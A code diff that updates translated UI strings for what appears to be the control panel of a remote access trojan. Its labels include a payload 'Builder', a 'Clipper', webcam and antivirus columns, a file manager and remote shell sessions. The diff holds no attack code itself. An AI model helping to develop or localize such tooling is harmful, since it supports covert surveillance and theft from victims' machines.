@@ -42,14 +42,14 @@ namespace SeroServer.UI
             ["NAV_DASHBOARD"] = new()
             {
                 ["en"] = "Dashboard", ["fr"] = "Tableau de bord", ["es"] = "Panel",
-                ["de"] = "Dashboard", ["pt"] = "Painel",          ["it"] = "Dashboard",
+                ["de"] = "Dashboard", ["pt"] = "Painel",          ["it"] = "Pannello",
                 ["ru"] = "Панель",    ["zh"] = "仪表板",            ["ar"] = "لوحة القيادة",
                 ["tr"] = "Panel",
             },
             ["NAV_ONLINE"] = new()
             {
                 ["en"] = "Online",  ["fr"] = "En ligne",   ["es"] = "En línea",
-                ["de"] = "Online",  ["pt"] = "Online",     ["it"] = "Online",
+                ["de"] = "Online",  ["pt"] = "On-line",    ["it"] = "In linea",
                 ["ru"] = "Онлайн",  ["zh"] = "在线",        ["ar"] = "متصل",
                 ["tr"] = "Çevrimiçi",
             },
@@ -63,14 +63,14 @@ namespace SeroServer.UI
             ["NAV_BUILDER"] = new()
             {
                 ["en"] = "Builder",  ["fr"] = "Constructeur", ["es"] = "Constructor",
-                ["de"] = "Builder",  ["pt"] = "Construtor",   ["it"] = "Builder",
+                ["de"] = "Builder",  ["pt"] = "Construtor",   ["it"] = "Costruttore",
                 ["ru"] = "Сборщик",  ["zh"] = "构建器",         ["ar"] = "المنشئ",
                 ["tr"] = "Oluşturucu",
             },
             ["NAV_AUTOTASK"] = new()
             {
                 ["en"] = "AutoTask", ["fr"] = "Tâche auto",   ["es"] = "Tarea auto",
-                ["de"] = "AutoTask", ["pt"] = "Tarefa auto",  ["it"] = "AutoTask",
+                ["de"] = "AutoTask", ["pt"] = "Tarefa auto",  ["it"] = "Auto-Task",
                 ["ru"] = "Авто-задача",["zh"] = "自动任务",     ["ar"] = "المهمة التلقائية",
                 ["tr"] = "Oto Görev",
             },
@@ -83,8 +83,8 @@ namespace SeroServer.UI
             },
             ["NAV_CLIPPER"] = new()
             {
-                ["en"] = "Clipper", ["fr"] = "Clipper",  ["es"] = "Clipper",
-                ["de"] = "Clipper", ["pt"] = "Clipper",  ["it"] = "Clipper",
+                ["en"] = "Clipper", ["fr"] = "Clipper",  ["es"] = "Interceptor",
+                ["de"] = "Clipper", ["pt"] = "Interceptador", ["it"] = "Intercettatore",
                 ["ru"] = "Клиппер", ["zh"] = "剪切器",    ["ar"] = "قاطع",
                 ["tr"] = "Kesici",
             },
@@ -676,9 +676,9 @@ namespace SeroServer.UI
             ["GRID_COL_AV"]      = new() { ["en"]="Antivirus",     ["fr"]="Antivirus",       ["es"]="Antivirus",    ["de"]="Antivirus",     ["pt"]="Antivírus",    ["it"]="Antivirus",    ["ru"]="Антивирус",          ["zh"]="杀毒软件",  ["ar"]="مضاد الفيروسات",  ["tr"]="Antivirüs" },
             ["GRID_COL_CAM"]     = new() { ["en"]="Webcam Icon",   ["fr"]="Icône Webcam",    ["es"]="Icono Webcam", ["de"]="Webcam-Symbol", ["pt"]="Ícone Webcam", ["it"]="Icona Webcam", ["ru"]="Значок веб-камеры",  ["zh"]="摄像头图标",["ar"]="أيقونة الكاميرا", ["tr"]="Webcam Simgesi" },
             ["GRID_COL_WINDOW"]  = new() { ["en"]="Active Window", ["fr"]="Fenêtre active",  ["es"]="Ventana activa",["de"]="Aktives Fenster",["pt"]="Janela ativa",["it"]="Finestra attiva",["ru"]="Активное окно", ["zh"]="活动窗口",  ["ar"]="النافذة النشطة",  ["tr"]="Aktif Pencere" },
-            ["DASHBOARD"]     = new() { ["en"]="Dashboard",          ["fr"]="Tableau de bord",    ["es"]="Panel",                    ["de"]="Dashboard",          ["pt"]="Painel",          ["it"]="Dashboard",        ["ru"]="Панель",           ["zh"]="仪表板",    ["ar"]="لوحة القيادة",     ["tr"]="Panel" },
+            ["DASHBOARD"]     = new() { ["en"]="Dashboard",          ["fr"]="Tableau de bord",    ["es"]="Panel",                    ["de"]="Dashboard",          ["pt"]="Painel",          ["it"]="Pannello",         ["ru"]="Панель",           ["zh"]="仪表板",    ["ar"]="لوحة القيادة",     ["tr"]="Panel" },
             ["ALL_CLIENTS"]   = new() { ["en"]="All Clients",        ["fr"]="Tous les clients",   ["es"]="Todos los clientes",       ["de"]="Alle Clients",       ["pt"]="Todos os clientes",["it"]="Tutti i client",   ["ru"]="Все клиенты",      ["zh"]="所有客户端", ["ar"]="جميع العملاء",      ["tr"]="Tüm İstemciler" },
-            ["BUILDER"]       = new() { ["en"]="Builder",            ["fr"]="Constructeur",       ["es"]="Constructor",              ["de"]="Builder",            ["pt"]="Construtor",      ["it"]="Builder",          ["ru"]="Сборщик",          ["zh"]="构建器",    ["ar"]="المنشئ",         ["tr"]="Oluşturucu" },
+            ["BUILDER"]       = new() { ["en"]="Builder",            ["fr"]="Constructeur",       ["es"]="Constructor",              ["de"]="Builder",            ["pt"]="Construtor",      ["it"]="Costruttore",      ["ru"]="Сборщик",          ["zh"]="构建器",    ["ar"]="المنشئ",         ["tr"]="Oluşturucu" },
             ["LOGS"]          = new() { ["en"]="Logs",               ["fr"]="Journaux",           ["es"]="Registros",                ["de"]="Protokolle",         ["pt"]="Logs",            ["it"]="Log",              ["ru"]="Логи",             ["zh"]="日志",      ["ar"]="السجلات",        ["tr"]="Günlükler" },
             ["SETTINGS"]      = new() { ["en"]="Settings",           ["fr"]="Paramètres",         ["es"]="Configuración",            ["de"]="Einstellungen",      ["pt"]="Configurações",   ["it"]="Impostazioni",     ["ru"]="Настройки",        ["zh"]="设置",      ["ar"]="الإعدادات",      ["tr"]="Ayarlar" },
             ["ABOUT"]         = new() { ["en"]="About",              ["fr"]="À propos",           ["es"]="Acerca de",                ["de"]="Über",               ["pt"]="Sobre",           ["it"]="Informazioni",     ["ru"]="О нас",            ["zh"]="关于",      ["ar"]="حول",           ["tr"]="Hakkında" },
@@ -997,6 +997,13 @@ namespace SeroServer.UI
             ["FM_ERR_PATH_NOT_FOUND"]= new() { ["en"]="Path not found: {0}",                     ["fr"]="Chemin introuvable : {0}",                        ["es"]="Ruta no encontrada: {0}",                            ["de"]="Pfad nicht gefunden: {0}",                    ["pt"]="Caminho não encontrado: {0}",                 ["it"]="Percorso non trovato: {0}",                     ["ru"]="Путь не найден: {0}",                       ["zh"]="路径未找到：{0}", ["ar"]="المسار غير موجود: {0}",         ["tr"]="Yol bulunamadı: {0}" },
             ["FM_ERR_FILE_NOT_FOUND"]= new() { ["en"]="File not found: {0}",                     ["fr"]="Fichier introuvable : {0}",                       ["es"]="Archivo no encontrado: {0}",                         ["de"]="Datei nicht gefunden: {0}",                   ["pt"]="Arquivo não encontrado: {0}",                 ["it"]="File non trovato: {0}",                         ["ru"]="Файл не найден: {0}",                       ["zh"]="文件未找到：{0}", ["ar"]="الملف غير موجود: {0}",          ["tr"]="Dosya bulunamadı: {0}" },
             ["FM_ERR_ACCESS_DENIED"] = new() { ["en"]="Access denied: {0}",                      ["fr"]="Accès refusé : {0}",                              ["es"]="Acceso denegado: {0}",                               ["de"]="Zugriff verweigert: {0}",                     ["pt"]="Acesso negado: {0}",                         ["it"]="Accesso negato: {0}",                           ["ru"]="Доступ запрещён: {0}",                      ["zh"]="访问被拒绝：{0}", ["ar"]="تم رفض الوصول: {0}",            ["tr"]="Erişim reddedildi: {0}" },
+            ["FM_SEARCH_TOOLTIP"]    = new() { ["en"]="Search files in this folder", ["fr"]="Rechercher des fichiers ici", ["es"]="Buscar archivos en esta carpeta", ["de"]="Dateien in diesem Ordner suchen", ["pt"]="Pesquisar arquivos nesta pasta", ["it"]="Cerca file in questa cartella", ["ru"]="Найти файлы в этой папке", ["zh"]="在此文件夹中搜索文件", ["ar"]="بحث عن ملفات في هذا المجلد", ["tr"]="Bu klasörde dosya ara" },
+            ["FM_COL_NAME"]          = new() { ["en"]="Name",     ["fr"]="Nom",        ["es"]="Nombre",     ["de"]="Name",     ["pt"]="Nome",      ["it"]="Nome",       ["ru"]="Имя",      ["zh"]="名称",    ["ar"]="الاسم",          ["tr"]="Ad" },
+            ["FM_COL_TYPE"]          = new() { ["en"]="Type",     ["fr"]="Type",       ["es"]="Tipo",       ["de"]="Typ",      ["pt"]="Tipo",      ["it"]="Tipo",       ["ru"]="Тип",      ["zh"]="类型",    ["ar"]="النوع",          ["tr"]="Tür" },
+            ["FM_COL_SIZE"]          = new() { ["en"]="Size",     ["fr"]="Taille",     ["es"]="Tamaño",     ["de"]="Größe",    ["pt"]="Tamanho",   ["it"]="Dimensione", ["ru"]="Размер",   ["zh"]="大小",    ["ar"]="الحجم",          ["tr"]="Boyut" },
+            ["FM_COL_MODIFIED"]      = new() { ["en"]="Modified", ["fr"]="Modifié",    ["es"]="Modificado", ["de"]="Geändert", ["pt"]="Modificado",["it"]="Modificato", ["ru"]="Изменено", ["zh"]="修改时间", ["ar"]="التعديل",        ["tr"]="Değiştirildi" },
+            ["FM_COL_CREATED"]       = new() { ["en"]="Created",  ["fr"]="Créé",       ["es"]="Creado",     ["de"]="Erstellt", ["pt"]="Criado",    ["it"]="Creato",     ["ru"]="Создано",  ["zh"]="创建时间", ["ar"]="تاريخ الإنشاء",  ["tr"]="Oluşturuldu" },
+            ["FM_COL_ATTR"]          = new() { ["en"]="Attr",     ["fr"]="Attr",       ["es"]="Attr",       ["de"]="Attr",     ["pt"]="Attr",      ["it"]="Attr",       ["ru"]="Атр",      ["zh"]="属性",    ["ar"]="سمات",           ["tr"]="Özellik" },
 
             // ── Shell ──────────────────────────────────────────────────────────────
             ["SHELL_SESSION_RECONNECTED"] = new() { ["en"]="--- Session reconnected ---", ["fr"]="--- Session reconnectée ---", ["es"]="--- Sesión reconectada ---", ["de"]="--- Sitzung wiederverbunden ---", ["pt"]="--- Sessão reconectada ---", ["it"]="--- Sessione riconnessa ---", ["ru"]="--- Сессия переподключена ---", ["zh"]="--- 会话已重新连接 ---", ["ar"]="--- تمت إعادة الاتصال ---", ["tr"]="--- Oturum yeniden bağlandı ---" },
